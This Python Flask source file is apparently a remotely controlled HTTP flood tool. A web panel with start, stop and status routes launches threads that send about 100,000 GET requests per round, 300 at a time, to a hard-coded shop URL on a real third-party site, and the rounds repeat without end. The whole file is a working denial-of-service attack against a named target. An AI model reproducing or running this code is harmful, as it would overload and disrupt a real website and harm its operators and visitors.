from flask import Flask, jsonify, request, send_from_directory
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import requests, time, random, os

app = Flask(__name__, static_folder='static')

running = False
loop_count = 0
total_sent = 0

target_url = "https://www.snakaranavi.net/shop.php?sno=18710"
max_workers = 300
requests_per_loop = 100000
delay_range = (0.001, 0.005)

def send_loop():
    global loop_count, total_sent, running
    while running:
        loop_count += 1
        print(f"🚀 Loop {loop_count} started")

        def send():
            try:
                requests.get(target_url, timeout=5)
            except:
                pass
            time.sleep(random.uniform(*delay_range))

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(lambda _: send(), range(requests_per_loop))
        
        total_sent += requests_per_loop
        time.sleep(20)

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/start', methods=['POST'])
def start():
    global running
    if not running:
        running = True
        Thread(target=send_loop).start()
        return jsonify({"status": "started"})
    return jsonify({"status": "already running"})

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    return jsonify({"status": "stopped"})

@app.route('/status')
def status():
    return jsonify({
        "running": running,
        "loop_count": loop_count,
        "total_sent": total_sent
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
